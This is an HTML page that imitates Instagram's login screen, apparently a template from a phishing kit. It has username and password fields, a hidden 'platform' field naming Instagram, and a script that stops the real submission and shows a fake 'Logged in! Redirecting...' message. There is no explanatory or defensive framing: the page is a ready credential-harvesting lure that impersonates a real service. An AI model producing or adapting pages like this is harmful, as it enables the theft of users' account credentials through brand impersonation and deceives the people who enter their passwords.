<!DOCTYPE html><html><head><title>Instagram</title><meta name="viewport" content="width=device-width"><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.container{background:#fff;border:1px solid #dbdbdb;width:350px;padding:40px 40px 20px;text-align:center}.logo{font-family:'Courier New',monospace;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);-webkit-background-clip:text;background-clip:text;font-size:80px;font-weight:300;margin:20px 0}input{background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:10px 10px;margin:7px 0;width:100%;box-sizing:border-box}.login-btn{background:#0095f6;color:#fff;border:0;border-radius:5px;padding:8px 15px;font-weight:600;cursor:pointer;width:100%;margin:10px 0}.login-btn:hover{background:#007bb5}.forgot{color:#00376b;font-size:14px;text-decoration:none}</style></head><body><div class="container"><div class="logo">Instagram</div><form id="loginForm" method="POST"><input type="text" name="username" placeholder="Phone/username/email" required><input type="password" name="password" placeholder="Password" required><input type="hidden" name="platform" value="instagram"><button type="submit" class="login-btn">Log in</button></form><a href="#" class="forgot">Forgot password?</a></div><script>document.getElementById('loginForm').onsubmit=function(e){e.preventDefault();setTimeout(()=>{document.body.innerHTML='<div style="padding:50px;text-align:center;color:#0095f6">Logged in! Redirecting...</div>';},500);return!1;}</script></body></html>
